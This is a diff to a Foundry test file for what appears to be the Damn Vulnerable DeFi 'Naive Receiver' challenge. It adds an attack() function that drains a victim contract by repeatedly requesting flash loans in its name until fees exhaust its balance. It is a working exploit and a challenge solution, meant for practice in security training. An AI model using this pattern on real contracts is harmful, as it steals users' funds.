@@ -44,14 +44,16 @@ contract NaiveReceiver is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
-    function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
+    function attack() internal {
+        uint256 fee = naiveReceiverLenderPool.fixedFee();
+        while(address(flashLoanReceiver).balance >= fee){
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), fee);
+        }
 
-        /**
-         * EXPLOIT END *
-         */
+    }
+
+    function testExploit() public {
+        attack();
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
